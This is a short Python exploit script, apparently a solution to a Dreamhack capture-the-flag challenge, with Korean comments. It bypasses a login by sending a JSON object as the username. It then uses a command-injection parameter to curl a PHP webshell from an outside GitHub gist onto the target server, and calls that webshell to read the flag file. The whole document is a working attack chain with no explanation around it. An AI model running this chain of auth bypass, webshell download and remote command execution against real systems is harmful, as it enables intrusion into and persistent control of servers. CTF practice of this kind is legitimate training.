import requests
import json
import threading

# 타겟 URL
url = "http://host3.dreamhack.games:21424/"

# 세션 유지
session = requests.Session()

def login_and_execute_cmd():
   
    login_data = {
        "username": json.dumps({"username": True})
    }
    login_response = session.post(url, data=login_data)
    print("Login Response:", login_response.text)

   
    download_webshell_cmd = "curl https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/50008b4501ccb7f804a61bc2e1a3d1df1cb403c4/easy-simple-php-webshell.php -o hello.php"
    webshell_response = session.get(f"{url}/test.php?cmd={download_webshell_cmd}")
    print("Webshell Download Response:", webshell_response.text)

    flag_response = session.get(f"{url}/hello.php?cmd=/flag")
    print("Flag Response:", flag_response.text)

# 멀티쓰레딩을 사용하여 작업 실행
thread = threading.Thread(target=login_and_execute_cmd)
thread.start()
thread.join()  # 모든 스레드 작업이 완료될 때까지 대기
